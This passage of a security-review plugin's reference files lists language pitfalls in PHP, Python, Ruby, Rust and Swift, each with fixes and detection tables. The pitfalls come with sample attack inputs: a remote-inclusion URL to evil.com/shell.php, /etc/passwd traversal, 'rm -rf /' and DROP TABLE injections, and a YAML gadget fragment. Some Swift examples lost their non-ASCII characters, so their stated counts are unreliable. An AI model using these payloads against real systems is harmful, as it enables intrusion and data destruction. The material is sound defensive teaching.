        "plugins/sharp-edges/skills/sharp-edges/references/lang-php.md": "# PHP Sharp Edges\n\n## Type Juggling\n\n```php\n// DANGEROUS: Loose comparison (==) does type coercion\n\"0e123\" == \"0e456\"   // TRUE - both parsed as 0 (scientific notation)\n\"0\" == false         // TRUE\n\"\" == false          // TRUE\n\"\" == 0              // TRUE (in PHP < 8)\n[] == false          // TRUE\nnull == false        // TRUE\n\n// Magic hash vulnerability\nmd5(\"240610708\") = \"0e462097431906509019562988736854\"\nmd5(\"QNKCDZO\")   = \"0e830400451993494058024219903391\"\nmd5(\"240610708\") == md5(\"QNKCDZO\")  // TRUE!\n\n// Both start with \"0e\" followed by digits = parsed as 0.0\n```\n\n**Fix**: Use strict comparison `===`:\n```php\n\"0e123\" === \"0e456\"  // FALSE\n$hash1 === $hash2    // Compares actual strings\n```\n\n## strcmp Returns NULL on Error\n\n```php\n// DANGEROUS: strcmp type confusion\nif (strcmp($_POST['password'], $stored_password) == 0) {\n    authenticate();\n}\n\n// Attacker sends: password[]=anything (array instead of string)\nstrcmp(array(), \"password\")  // Returns NULL, not -1 or 1\n\n// NULL == 0 is TRUE in PHP!\n// Authentication bypassed!\n```\n\n**Fix**: Validate input type and use `===`:\n```php\nif (is_string($_POST['password']) &&\n    strcmp($_POST['password'], $stored_password) === 0) {\n    authenticate();\n}\n```\n\n## Variable Variables and Extract\n\n```php\n// DANGEROUS: Variable variables\n$name = $_GET['name'];  // \"isAdmin\"\n$$name = $_GET['value']; // \"true\"\n// Creates $isAdmin = \"true\"\n\n// DANGEROUS: extract() creates variables from array\nextract($_POST);  // Every POST param becomes a variable!\n// Attacker sends POST: isAdmin=true  $isAdmin = true\n\n// Can overwrite existing variables:\n$isAdmin = false;\nextract($_POST);  // Attacker overwrites $isAdmin\n```\n\n**Fix**: Never use `extract()` with user input. Use explicit assignment.\n\n## Unserialize RCE\n\n```php\n// DANGEROUS: Like pickle, instantiates arbitrary objects\n$obj = unserialize($_GET['data']);\n\n// Attacker crafts serialized data that:\n// 1. Instantiates class with dangerous __wakeup() or __destruct()\n// 2. Chains through multiple classes (\"POP gadgets\")\n// 3. Achieves code execution\n\n// Common gadget chains in:\n// - Laravel, Symfony, WordPress, Magento\n// - phpggc tool generates payloads automatically\n```\n\n**Fix**: Never unserialize untrusted data. Use JSON instead.\nIf you must, use `allowed_classes` parameter (PHP 7.0+):\n```php\nunserialize($data, ['allowed_classes' => false]);\nunserialize($data, ['allowed_classes' => ['SafeClass']]);\n```\n\n## preg_replace with /e Modifier\n\n```php\n// DANGEROUS: /e modifier executes replacement as PHP code\n// Removed in PHP 7.0, but legacy code still exists\npreg_replace('/.*/e', $_GET['code'], '');\n// Executes arbitrary PHP code!\n\n// Even without /e, user-controlled patterns are dangerous:\npreg_replace($_GET['pattern'], $replacement, $subject);\n// Attacker can add /e modifier in pattern\n```\n\n**Fix**: Use `preg_replace_callback()` instead of /e.\n\n## include/require with User Input\n\n```php\n// DANGEROUS: Local File Inclusion\ninclude($_GET['page'] . '.php');\n\n// Attacker: ?page=../../../etc/passwd%00\n// (null byte truncates .php in old PHP)\n\n// Attacker: ?page=php://filter/convert.base64-encode/resource=config\n// Reads and encodes config.php\n\n// DANGEROUS: Remote File Inclusion (if allow_url_include=On)\ninclude($_GET['url']);\n// Attacker: ?url=http://evil.com/shell.php\n```\n\n**Fix**: Whitelist allowed files, never use user input in include.\n\n## == vs === with Objects\n\n```php\n// DANGEROUS: == compares values, === compares identity\n$a = new stdClass();\n$a->value = 1;\n\n$b = new stdClass();\n$b->value = 1;\n\n$a == $b;   // TRUE - same property values\n$a === $b;  // FALSE - different objects\n\n// This can bypass checks:\nif ($user == $admin) {  // Compares properties, not identity!\n    grantAccess();\n}\n```\n\n## Floating Point in Equality\n\n```php\n// DANGEROUS: Float comparison\n0.1 + 0.2 == 0.3  // FALSE!\n// Actually: 0.30000000000000004\n\n// DANGEROUS: Float to int conversion\n(int)\"1e2\"   // 1 (not 100!)\n(int)1e2     // 100\n\n// In array keys:\n$arr[(int)\"1e2\"] = \"a\";  // $arr[1]\n$arr[(int)1e2] = \"b\";    // $arr[100]\n```\n\n## Shell Command Injection\n\n```php\n// DANGEROUS: Unescaped shell commands\nsystem(\"ls \" . $_GET['dir']);\nexec(\"grep \" . $_GET['pattern'] . \" file.txt\");\npassthru(\"convert \" . $_FILES['image']['name']);\n\n// Attacker: ?dir=; rm -rf /\n```\n\n**Fix**: Use `escapeshellarg()` and `escapeshellcmd()`:\n```php\nsystem(\"ls \" . escapeshellarg($_GET['dir']));\n```\n\nBetter: Avoid shell commands entirely, use PHP functions.\n\n## Array Key Coercion\n\n```php\n// DANGEROUS: Array keys are coerced\n$arr = [];\n$arr[\"0\"] = \"a\";\n$arr[0] = \"b\";\n$arr[\"00\"] = \"c\";\n\n// Result: $arr = [0 => \"b\", \"00\" => \"c\"]\n// String \"0\" was coerced to integer 0!\n\n$arr[true] = \"x\";   // $arr[1] = \"x\"\n$arr[false] = \"y\";  // $arr[0] = \"y\"\n$arr[null] = \"z\";   // $arr[\"\"] = \"z\"\n```\n\n## Null Coalescing Pitfalls\n\n```php\n// ?? only checks for null/undefined, NOT falsy\n$value = $_GET['x'] ?? 'default';\n\n// If $_GET['x'] is \"\", 0, \"0\", false, []\n// These are NOT null, so no default is used!\n\n// vs ternary which checks truthiness:\n$value = $_GET['x'] ?: 'default';  // Uses default for falsy values\n\n// But ?: triggers notice for undefined variables\n```\n\n## Session Fixation\n\n```php\n// DANGEROUS: Accepting session ID from user\nsession_id($_GET['session']);\nsession_start();\n\n// Attacker:\n// 1. Gets victim to visit: site.com?session=attacker_knows_this\n// 2. Victim logs in\n// 3. Attacker uses same session ID to hijack session\n```\n\n**Fix**: Regenerate session ID after authentication:\n```php\nsession_start();\n// ... authenticate user ...\nsession_regenerate_id(true);  // true deletes old session\n```\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| `== ` comparison with user input | Type juggling |\n| `strcmp($user_input, ...)` | NULL comparison bypass |\n| `$$var` or `extract($_` | Variable injection |\n| `unserialize($user_input)` | Object injection RCE |\n| `preg_replace('/e'` | Code execution |\n| `include($user_input)` | File inclusion |\n| `system/exec/passthru($user_input)` | Command injection |\n| `\"0e\\d+\" == \"0e\\d+\"` | Magic hash comparison |\n| `session_id($_GET` | Session fixation |\n| Missing `===` for security checks | Type confusion bypass |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-python.md": "# Python Sharp Edges\n\n## Mutable Default Arguments\n\n```python\n# DANGEROUS: Default is shared across all calls\ndef append_to(item, target=[]):\n    target.append(item)\n    return target\n\nappend_to(1)  # [1]\nappend_to(2)  # [1, 2] - same list!\nappend_to(3)  # [1, 2, 3]\n\n# Also affects dicts and other mutables\ndef register(name, registry={}):\n    registry[name] = True\n    return registry\n```\n\n**The Problem**: Default arguments are evaluated once at function definition, not at each call.\n\n**Fix**: Use `None` sentinel:\n```python\ndef append_to(item, target=None):\n    if target is None:\n        target = []\n    target.append(item)\n    return target\n```\n\n## Eval, Exec, and Code Execution\n\n```python\n# DANGEROUS: Arbitrary code execution\neval(user_input)      # Executes Python expression\nexec(user_input)      # Executes Python statements\n\n# DANGEROUS: compile + exec\ncode = compile(user_input, '<string>', 'exec')\nexec(code)\n\n# DANGEROUS: input() in Python 2\n# In Python 2: input() == eval(raw_input())\n# Python 2 code taking input() from users = RCE\n\n# DANGEROUS: Dynamic import\n__import__(user_input)\nimportlib.import_module(user_input)\n```\n\n**Also Dangerous**:\n- `pickle.loads()` - arbitrary code execution\n- `yaml.load()` - arbitrary code execution (use `safe_load`)\n- `subprocess.Popen(shell=True)` with user input\n\n## Late Binding Closures\n\n```python\n# DANGEROUS: Closures capture variable by reference, not value\nfuncs = []\nfor i in range(3):\n    funcs.append(lambda: i)\n\n[f() for f in funcs]  # [2, 2, 2] - all see final i\n\n# Same with list comprehension\nfuncs = [lambda: i for i in range(3)]\n[f() for f in funcs]  # [2, 2, 2]\n```\n\n**Fix**: Capture by value using default argument:\n```python\nfuncs = []\nfor i in range(3):\n    funcs.append(lambda i=i: i)  # i=i captures current value\n\n[f() for f in funcs]  # [0, 1, 2]\n```\n\n## Identity vs Equality\n\n```python\n# DANGEROUS: 'is' checks identity, not equality\na = 256\nb = 256\na is b  # True - CPython caches small integers [-5, 256]\n\na = 257\nb = 257\na is b  # False - different objects!\n\n# String interning is also unpredictable\ns1 = \"hello\"\ns2 = \"hello\"\ns1 is s2  # True - interned\n\ns1 = \"hello world\"\ns2 = \"hello world\"\ns1 is s2  # Maybe - depends on context\n\n# DANGEROUS in conditionals\nif x is True:   # Wrong - use: if x is True (for singletons only)\nif x is 1:      # Wrong - use: if x == 1\n```\n\n**Rule**: Use `is` only for `None`, `True`, `False`, and explicit singleton checks.\n\n## Import Shadowing\n\n```python\n# DANGEROUS: Naming your file same as stdlib module\n# File: random.py\nimport random\nprint(random.randint(1, 10))  # ImportError or recursion!\n\n# Your random.py shadows the stdlib random module\n\n# Similarly dangerous names:\n# - email.py (shadows email module)\n# - test.py (shadows test framework)\n# - types.py (shadows types module)\n```\n\n## Exception Handling Pitfalls\n\n```python\n# DANGEROUS: Bare except catches everything\ntry:\n    risky_operation()\nexcept:  # Catches KeyboardInterrupt, SystemExit, etc.\n    pass\n\n# DANGEROUS: Catching Exception still misses some\ntry:\n    risky_operation()\nexcept Exception:  # Misses KeyboardInterrupt, SystemExit\n    pass\n\n# DANGEROUS: Silently swallowing\ntry:\n    important_security_check()\nexcept SomeError:\n    pass  # Security check failure ignored!\n\n# DANGEROUS: Exception in except block\ntry:\n    operation()\nexcept SomeError as e:\n    log(e)  # If log() raises, original exception lost\n    raise\n```\n\n## Name Rebinding in Loops\n\n```python\n# DANGEROUS: Reusing loop variable\nfor item in items:\n    process(item)\n\n# Later in same scope:\nprint(item)  # Still bound to last item!\n\n# DANGEROUS with exceptions\nfor item in items:\n    try:\n        process(item)\n    except Exception as e:\n        pass\n\n# In Python 3, 'e' is deleted after except block\n# But 'item' persists\n```\n\n## Class vs Instance Attributes\n\n```python\n# DANGEROUS: Mutable class attribute shared by all instances\nclass User:\n    permissions = []  # Class attribute - shared!\n\nu1 = User()\nu2 = User()\nu1.permissions.append('admin')\nprint(u2.permissions)  # ['admin'] - u2 is also admin!\n```\n\n**Fix**: Initialize in `__init__`:\n```python\nclass User:\n    def __init__(self):\n        self.permissions = []  # Instance attribute - unique\n```\n\n## String Formatting Injection\n\n```python\n# DANGEROUS: Format string with user data as format spec\ntemplate = user_input  # \"{0.__class__.__mro__[1].__subclasses__()}\"\ntemplate.format(some_object)  # Can access arbitrary attributes!\n\n# DANGEROUS: f-string with user input (if using eval)\neval(f'f\"{user_input}\"')  # Code execution\n\n# DANGEROUS: % formatting with user-controlled format\nuser_template % (data,)  # Less dangerous but still risky\n```\n\n**Fix**: Use string concatenation or safe templating (Jinja2 with autoescape).\n\n## Numeric Precision\n\n```python\n# DANGEROUS: Float comparison\n0.1 + 0.2 == 0.3  # False!\n# 0.1 + 0.2 = 0.30000000000000004\n\n# DANGEROUS: Large integer to float\nn = 10**20\nfloat(n) == float(n + 1)  # True - precision loss\n\n# DANGEROUS: Division in Python 2\n# 5 / 2 = 2 (integer division in Python 2)\n# 5 / 2 = 2.5 (float division in Python 3)\n```\n\n## Unpacking Pitfalls\n\n```python\n# DANGEROUS: Unpacking user-controlled data\na, b, c = user_list  # ValueError if wrong length\n\n# Can be used for DoS:\n# Send list with 10 million elements to function expecting 3\n# Python will iterate entire list before raising ValueError\n```\n\n## Subprocess Shell Injection\n\n```python\n# DANGEROUS: shell=True with user input\nimport subprocess\nsubprocess.run(f\"ls {user_input}\", shell=True)\n# user_input = \"; rm -rf /\"  command injection\n\n# SAFE: Use list form without shell\nsubprocess.run([\"ls\", user_input])  # user_input is just an argument\n```\n\n## Attribute Access on None\n\n```python\n# DANGEROUS: Chained access without checks\nresult = api.get_user().profile.settings.theme\n# Any None in chain causes AttributeError\n\n# Python doesn't have optional chaining like JS (?.)\n# Must check each step or use getattr with default\n```\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| `def f(x=[])` or `def f(x={})` | Mutable default argument |\n| `eval(`, `exec(`, `compile(` | Code execution |\n| `pickle.loads(`, `yaml.load(` | Deserialization RCE |\n| `lambda: var` in loop | Late binding closure |\n| `x is 1`, `x is \"string\"` | Identity vs equality confusion |\n| `import x` where x.py exists locally | Import shadowing |\n| `except:` or `except Exception:` | Over-broad exception catching |\n| `class Foo: bar = []` | Shared mutable class attribute |\n| `template.format(obj)` with user template | Format string injection |\n| `subprocess.*(..., shell=True)` | Command injection |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-ruby.md": "# Ruby Sharp Edges\n\n## Dynamic Code Execution\n\n```ruby\n# DANGEROUS: eval executes arbitrary code\neval(user_input)\n\n# DANGEROUS: send calls arbitrary method\nobject.send(user_input, *args)\nobject.public_send(user_input)  # Only public, still dangerous\n\n# DANGEROUS: constantize gets arbitrary class\nuser_input.constantize  # Rails\nObject.const_get(user_input)\n\n# DANGEROUS: instance_variable_get/set\nobj.instance_variable_set(\"@#{user_input}\", value)\n```\n\n**Real Vulnerabilities**:\n- CVE-2013-0156: Rails XML parameter parsing led to code execution\n- Countless Rails apps vulnerable to controller#action injection\n\n**Fix**: Whitelist allowed values:\n```ruby\nALLOWED_METHODS = %w[create update delete].freeze\nraise unless ALLOWED_METHODS.include?(user_input)\nobject.send(user_input)\n```\n\n## YAML.load RCE\n\n```ruby\n# DANGEROUS: Like pickle, instantiates arbitrary objects\nYAML.load(user_input)\n\n# Attacker payload:\n# --- !ruby/object:Gem::Installer\n# i: x\n# --- !ruby/object:Gem::SpecFetcher\n# i: y\n# --- !ruby/object:Gem::Requirement\n# requirements:\n#   !ruby/object:Gem::Package::TarReader\n#   io: &1 !ruby/object:Net::BufferedIO\n#     ...\n\n# Chains through multiple classes to achieve RCE\n```\n\n**Fix**: Use `YAML.safe_load`:\n```ruby\nYAML.safe_load(user_input)\nYAML.safe_load(user_input, permitted_classes: [Date, Time])\n```\n\n## Mass Assignment\n\n```ruby\n# DANGEROUS: All params assigned to model (Rails < 4)\nUser.new(params[:user])\n# If params includes {admin: true, role: \"superuser\"}...\n\n# Also dangerous with update_attributes\nuser.update_attributes(params[:user])\n```\n\n**Fix**: Strong Parameters (Rails 4+):\n```ruby\ndef user_params\n    params.require(:user).permit(:name, :email)  # Allowlist\nend\n\nUser.new(user_params)\n```\n\n## SQL Injection\n\n```ruby\n# DANGEROUS: String interpolation in queries\nUser.where(\"name = '#{params[:name]}'\")\nUser.where(\"name = '\" + params[:name] + \"'\")\n\n# DANGEROUS: Array form with interpolation\nUser.where([\"name = ?\", params[:name]])  # Safe\nUser.where([\"name = #{params[:name]}\"])  # NOT safe!\n\n# DANGEROUS: order() with user input\nUser.order(params[:sort])  # Can inject: \"name; DROP TABLE users--\"\n```\n\n**Fix**: Use parameterized queries:\n```ruby\nUser.where(name: params[:name])\nUser.where(\"name = ?\", params[:name])\nUser.order(Arel.sql(sanitize(params[:sort])))  # With validation\n```\n\n## Command Injection\n\n```ruby\n# DANGEROUS: Backticks and system with interpolation\n`ls #{params[:dir]}`\nsystem(\"ls #{params[:dir]}\")\nexec(\"ls #{params[:dir]}\")\n%x(ls #{params[:dir]})\n\n# Attacker: dir=\"; rm -rf /\"\n```\n\n**Fix**: Use array form:\n```ruby\nsystem(\"ls\", params[:dir])  # Argument passed safely\nOpen3.capture3(\"ls\", params[:dir])\n```\n\n## Regex Injection\n\n```ruby\n# DANGEROUS: User input in regex\npattern = Regexp.new(params[:pattern])\nstring.match(pattern)\n\n# ReDoS attack: pattern = \"(a+)+\"\n# Denial of service\n\n# Also: Anchors don't work as expected\n/^admin$/.match(\"admin\\nuser\")  # Matches! ^ and $ match line boundaries\n```\n\n**Fix**: Use `\\A` and `\\z` for string boundaries:\n```ruby\n/\\Aadmin\\z/  # Only matches exactly \"admin\"\nRegexp.escape(user_input)  # Escape special characters\n```\n\n## Symbol DoS (Ruby < 2.2)\n\n```ruby\n# DANGEROUS in Ruby < 2.2: Symbols never garbage collected\nparams[:key].to_sym  # Each unique key creates permanent symbol\n\n# Attacker sends millions of unique parameter names\n# Memory exhaustion - symbols fill memory\n```\n\n**Note**: Fixed in Ruby 2.2+ with symbol GC, but still worth avoiding unnecessary `to_sym` on user input.\n\n## Method Visibility\n\n```ruby\n# DANGEROUS: private/protected don't prevent send()\nclass Secret\n    private\n    def sensitive_data\n        \"secret\"\n    end\nend\n\nobj.send(:sensitive_data)  # Works!\nobj.sensitive_data         # NoMethodError (as expected)\n```\n\n## Default Mutable Arguments\n\n```ruby\n# DANGEROUS: Same pattern as Python\ndef add_item(item, list = [])\n    list << item\n    list\nend\n\nadd_item(1)  # [1]\nadd_item(2)  # [1, 2] - same array!\n```\n\n**Fix**: Use nil default:\n```ruby\ndef add_item(item, list = nil)\n    list ||= []\n    list << item\nend\n```\n\n## ERB Template Injection\n\n```ruby\n# DANGEROUS: User input in ERB template\ntemplate = ERB.new(params[:template])\ntemplate.result(binding)\n\n# Attacker template: <%= `whoami` %>\n# Executes shell command\n\n# Also via:\ntemplate = params[:template]\neval(\"\\\"#{template}\\\"\")  # If template contains #{}\n```\n\n## File Operations\n\n```ruby\n# DANGEROUS: Path traversal\nFile.read(\"uploads/#{params[:filename]}\")\n# Attacker: filename=../../../etc/passwd\n\n# DANGEROUS: File.open with pipe\nFile.open(\"|#{params[:cmd]}\")  # Executes command!\n\n# The | prefix runs a command and opens pipe to it\nFile.read(\"|whoami\")  # Returns output of whoami\n```\n\n**Fix**: Validate and sanitize paths:\n```ruby\npath = File.expand_path(params[:filename], uploads_dir)\nraise unless path.start_with?(uploads_dir)\n```\n\n## Comparison Gotchas\n\n```ruby\n# DANGEROUS: == vs eql? vs equal?\na = \"hello\"\nb = \"hello\"\n\na == b       # true - value comparison\na.eql?(b)    # true - value + type comparison\na.equal?(b)  # false - identity comparison\n\n# Array comparison\n[1, 2] == [1, 2]  # true\n[1, 2].eql?([1, 2])  # true\n[1, 2].equal?([1, 2])  # false\n```\n\n## Thread Safety\n\n```ruby\n# DANGEROUS: Ruby global interpreter lock (GIL) doesn't protect everything\n@counter = 0\n\nthreads = 10.times.map do\n    Thread.new { 1000.times { @counter += 1 } }\nend\nthreads.each(&:join)\n\n@counter  # May not be 10000! Read-modify-write isn't atomic\n```\n\n**Fix**: Use Mutex or atomic operations:\n```ruby\nmutex = Mutex.new\nmutex.synchronize { @counter += 1 }\n```\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| `eval(`, `instance_eval(` | Code execution |\n| `.send(user_input`, `.public_send(` | Method injection |\n| `.constantize`, `const_get(` | Class injection |\n| `YAML.load(` | Deserialization RCE |\n| `.new(params[` without strong params | Mass assignment |\n| `where(\"... #{` | SQL injection |\n| `` `...#{` ``, `system(\"...#{` | Command injection |\n| `Regexp.new(user_input)` | ReDoS |\n| `params[:x].to_sym` | Symbol DoS (old Ruby) |\n| `ERB.new(user_input)` | Template injection |\n| `File.read(\"|...` or `File.open(\"|...` | Command execution |\n| `File.read(params[` without path validation | Path traversal |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-rust.md": "# Rust Sharp Edges\n\n## Integer Overflow Behavior Differs by Build\n\n```rust\n// In debug builds: panics\n// In release builds: wraps silently!\nlet x: u8 = 255;\nlet y = x + 1;  // Debug: panic! Release: y = 0\n\nfn calculate_size(count: usize, element_size: usize) -> usize {\n    count * element_size  // Panics in debug, wraps in release\n}\n```\n\n**The Problem**: Behavior differs between debug and release. Bugs may only manifest in production.\n\n**Fix**: Use explicit methods:\n```rust\n// Wrapping (explicitly allows overflow)\nlet y = x.wrapping_add(1);\n\n// Checked (returns Option)\nlet y = x.checked_add(1);  // None if overflow\n\n// Saturating (clamps to max/min)\nlet y = x.saturating_add(1);  // 255 if would overflow\n\n// Overflowing (returns value + overflow flag)\nlet (y, overflowed) = x.overflowing_add(1);\n```\n\n## Unsafe Blocks\n\n```rust\n// DANGEROUS: Unsafe disables Rust's safety guarantees\nunsafe {\n    // Can dereference raw pointers\n    let ptr: *const i32 = &42;\n    let val = *ptr;\n\n    // Can call unsafe functions\n    libc::free(ptr as *mut libc::c_void);\n\n    // Can access mutable statics\n    GLOBAL_COUNTER += 1;\n\n    // Can implement unsafe traits\n}\n\n// Real vulnerabilities from unsafe:\n// - CVE-2019-15548: memory safety bug in slice::from_raw_parts\n// - Many FFI-related vulnerabilities\n```\n\n**Audit Focus**: Every `unsafe` block should have a SAFETY comment explaining invariants.\n\n```rust\n// GOOD: Documented safety invariants\n// SAFETY: ptr is valid for reads of `len` bytes,\n// properly aligned, and the memory won't be mutated\n// for the lifetime 'a\nunsafe { std::slice::from_raw_parts(ptr, len) }\n```\n\n## Mem::forget Skips Destructors\n\n```rust\n// DANGEROUS: Resources never cleaned up\nlet guard = mutex.lock().unwrap();\nstd::mem::forget(guard);  // Lock never released = deadlock\n\nlet file = File::open(\"data.txt\")?;\nstd::mem::forget(file);  // File descriptor leaked\n\n// Can be used to create memory unsafety with certain types\nlet mut vec = vec![1, 2, 3];\nlet ptr = vec.as_mut_ptr();\nstd::mem::forget(vec);  // Vec's memory leaked, but ptr still valid... maybe\n```\n\n**Note**: `mem::forget` is safe (not `unsafe`), but can cause resource leaks and logical bugs.\n\n## Panics and Unwinding\n\n```rust\n// DANGEROUS: Panic in FFI boundary is UB\n#[no_mangle]\npub extern \"C\" fn called_from_c() {\n    panic!(\"oops\");  // Undefined behavior!\n}\n\n// SAFE: Catch panic at FFI boundary\n#[no_mangle]\npub extern \"C\" fn called_from_c() -> i32 {\n    match std::panic::catch_unwind(|| {\n        might_panic();\n    }) {\n        Ok(_) => 0,\n        Err(_) => -1,\n    }\n}\n\n// DANGEROUS: Panic in Drop can abort\nimpl Drop for MyType {\n    fn drop(&mut self) {\n        if something_wrong() {\n            panic!(\"in drop\");  // If already unwinding, aborts!\n        }\n    }\n}\n```\n\n## Unwrap and Expect\n\n```rust\n// DANGEROUS: Panics on None/Err\nlet value = some_option.unwrap();  // Panics if None\nlet result = fallible_fn().unwrap();  // Panics if Err\n\n// In libraries: propagate errors with ?\nfn library_fn() -> Result<T, E> {\n    let value = fallible_fn()?;  // Propagates error\n    Ok(value)\n}\n\n// In binaries: use expect() with context\nlet config = load_config()\n    .expect(\"failed to load config from config.toml\");\n```\n\n## Interior Mutability Pitfalls\n\n```rust\n// DANGEROUS: RefCell panics at runtime on borrow violations\nuse std::cell::RefCell;\n\nlet cell = RefCell::new(42);\nlet borrow1 = cell.borrow_mut();\nlet borrow2 = cell.borrow_mut();  // PANIC: already borrowed\n\n// Can happen across function calls - hard to track\nfn takes_ref(cell: &RefCell<i32>) {\n    let _b = cell.borrow_mut();\n    other_fn(cell);  // If this also borrows_mut: panic!\n}\n\n// SAFER: Use try_borrow_mut\nif let Ok(mut borrow) = cell.try_borrow_mut() {\n    *borrow += 1;\n}\n```\n\n## Send and Sync Misuse\n\n```rust\n// DANGEROUS: Incorrect Send/Sync implementations\nstruct MyWrapper(*mut SomeType);\n\n// This is WRONG if SomeType isn't thread-safe:\nunsafe impl Send for MyWrapper {}\nunsafe impl Sync for MyWrapper {}\n\n// Real vulnerability: Rc<T> is not Send/Sync for good reason\n// Incorrectly marking a type as Send/Sync enables data races\n```\n\n## Lifetime Elision Surprises\n\n```rust\n// The compiler infers lifetimes, but sometimes wrong\nimpl MyStruct {\n    // Elided: fn get(&self) -> &str\n    // Means:  fn get<'a>(&'a self) -> &'a str\n    fn get(&self) -> &str {\n        &self.data\n    }\n}\n\n// But what if you return something else?\nimpl MyStruct {\n    // WRONG: Elision assumes output lifetime = self lifetime\n    fn get_static(&self) -> &str {\n        \"static string\"  // Actually 'static, not 'self\n    }\n\n    // RIGHT: Be explicit\n    fn get_static(&self) -> &'static str {\n        \"static string\"\n    }\n}\n```\n\n## Deref Coercion Confusion\n\n```rust\n// Can be confusing when method resolution happens\nuse std::ops::Deref;\n\nstruct Wrapper(String);\nimpl Deref for Wrapper {\n    type Target = String;\n    fn deref(&self) -> &String { &self.0 }\n}\n\nlet w = Wrapper(String::from(\"hello\"));\nw.len();  // Calls String::len via Deref\nw.capacity();  // Also String::capacity\n\n// What if Wrapper has its own len()?\nimpl Wrapper {\n    fn len(&self) -> usize { 42 }\n}\nw.len();  // Now calls Wrapper::len, not String::len\n(*w).len();  // Explicitly calls String::len\n```\n\n## Drop Order\n\n```rust\n// Fields dropped in declaration order\nstruct S {\n    first: A,   // Dropped last\n    second: B,  // Dropped first\n}\n\n// Can cause issues if B depends on A\nstruct Connection {\n    pool: Arc<Pool>,      // Dropped second\n    conn: PooledConn,     // Dropped first - needs pool!\n}\n\n// Fix: reorder fields, or use ManuallyDrop\n```\n\n## Macro Hygiene Gaps\n\n```rust\n// macro_rules! has hygiene gaps\nmacro_rules! make_var {\n    ($name:ident) => {\n        let $name = 42;\n    }\n}\n\nmake_var!(x);\nprintln!(\"{}\", x);  // Works - x is in scope\n\n// But: macros can capture identifiers unexpectedly\nmacro_rules! double {\n    ($e:expr) => {\n        { let x = $e; x + x }  // Shadows any x in $e!\n    }\n}\n\nlet x = 10;\ndouble!(x + 1)  // Doesn't do what you expect\n```\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| `+`, `-`, `*` on integers | Overflow (release wraps) |\n| `unsafe { }` | All bets off - audit carefully |\n| `mem::forget()` | Resource leak, deadlock |\n| `.unwrap()`, `.expect()` | Panic on None/Err |\n| `RefCell::borrow_mut()` | Runtime panic on double borrow |\n| `unsafe impl Send/Sync` | Potential data races |\n| `extern \"C\" fn` without catch_unwind | UB on panic |\n| Drop impl with panic | Double panic = abort |\n| Complex deref chains | Method resolution confusion |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-swift.md": "# Swift Sharp Edges\n\n## Force Unwrapping\n\n```swift\n// DANGEROUS: Crashes on nil\nlet value = optionalValue!  // Runtime crash if nil\n\n// Common in:\nlet cell = tableView.dequeueReusableCell(...)!\nlet url = URL(string: userInput)!\nlet data = try! JSONDecoder().decode(...)\n\n// DANGEROUS: Implicitly Unwrapped Optionals\nvar name: String!  // IUO - crashes if accessed while nil\n\nclass ViewController: UIViewController {\n    @IBOutlet weak var label: UILabel!  // Nil before viewDidLoad\n}\n```\n\n**Fix**: Use optional binding or nil-coalescing:\n```swift\nif let value = optionalValue {\n    use(value)\n}\nlet value = optionalValue ?? defaultValue\nguard let value = optionalValue else { return }\n```\n\n## try! and try?\n\n```swift\n// DANGEROUS: try! crashes on error\nlet data = try! Data(contentsOf: url)\n\n// DANGEROUS: try? silently converts error to nil\nlet data = try? Data(contentsOf: url)\n// No way to know if failure was \"file not found\" or \"permission denied\"\n\n// DANGEROUS: Ignoring error completely\ndo {\n    try riskyOperation()\n} catch {\n    // Error swallowed\n}\n```\n\n**Fix**: Handle errors explicitly:\n```swift\ndo {\n    let data = try Data(contentsOf: url)\n} catch let error as NSError where error.code == NSFileNoSuchFileError {\n    // Handle file not found\n} catch {\n    // Handle other errors\n}\n```\n\n## as! Force Cast\n\n```swift\n// DANGEROUS: Crashes if cast fails\nlet user = object as! User\n\n// Common antipattern:\nlet cell = tableView.dequeueReusableCell(...) as! CustomCell\n// Crashes if wrong identifier or wrong class\n```\n\n**Fix**: Use conditional cast:\n```swift\nif let user = object as? User {\n    use(user)\n}\nguard let user = object as? User else {\n    return  // or handle error\n}\n```\n\n## String/NSString Bridging\n\n```swift\n// DANGEROUS: Different indexing semantics\nlet nsString: NSString = \"caf\"\nlet swiftString = nsString as String\n\nnsString.length        // 5 (UTF-16 code units)\nswiftString.count      // 4 (extended grapheme clusters)\n\n// Range confusion:\nlet range = nsString.range(of: \"\")  // NSRange (UTF-16)\n// Can't directly use with String (uses String.Index)\n\n// DANGEROUS: Emoji handling\nlet emoji = \"\"  // Family emoji\nemoji.count           // 1 (grapheme cluster)\nemoji.utf16.count     // 11 (UTF-16)\n(emoji as NSString).length  // 11\n```\n\n## Reference Cycles\n\n```swift\n// DANGEROUS: Strong reference cycles cause memory leaks\nclass Person {\n    var apartment: Apartment?\n}\nclass Apartment {\n    var tenant: Person?  // Strong reference\n}\n\nlet john = Person()\nlet apt = Apartment()\njohn.apartment = apt\napt.tenant = john  // Cycle! Neither deallocated\n\n// DANGEROUS: Closures capture self strongly\nclass MyClass {\n    var callback: (() -> Void)?\n\n    func setup() {\n        callback = {\n            self.doSomething()  // Strong capture of self\n        }\n    }\n}\n```\n\n**Fix**: Use `weak` or `unowned`:\n```swift\nclass Apartment {\n    weak var tenant: Person?  // Weak breaks cycle\n}\n\ncallback = { [weak self] in\n    self?.doSomething()\n}\n```\n\n## Array/Dictionary Thread Safety\n\n```swift\n// DANGEROUS: Collections are not thread-safe\nvar array = [Int]()\n\n// Thread 1:\narray.append(1)\n\n// Thread 2:\narray.append(2)\n\n// Crash or corruption possible!\n```\n\n**Fix**: Use serial dispatch queue, locks, or actors (Swift 5.5+):\n```swift\nactor SafeStorage {\n    private var items = [Int]()\n\n    func add(_ item: Int) {\n        items.append(item)\n    }\n}\n```\n\n## Numeric Overflow\n\n```swift\n// In debug: crashes (overflow check)\n// In release: also crashes by default (unlike C)\nlet x: Int8 = 127\nlet y = x + 1  // Fatal error: arithmetic overflow\n\n// BUT: If using &+ operators, wraps silently\nlet y = x &+ 1  // -128 (wrapping)\n```\n\nThis is safer than C, but `&+` operators can still cause issues.\n\n## Uninitialized Properties\n\n```swift\n// DANGEROUS: Accessing before initialization\nclass MyClass {\n    var value: Int\n\n    init() {\n        print(value)  // Compile error in Swift, thankfully\n        value = 42\n    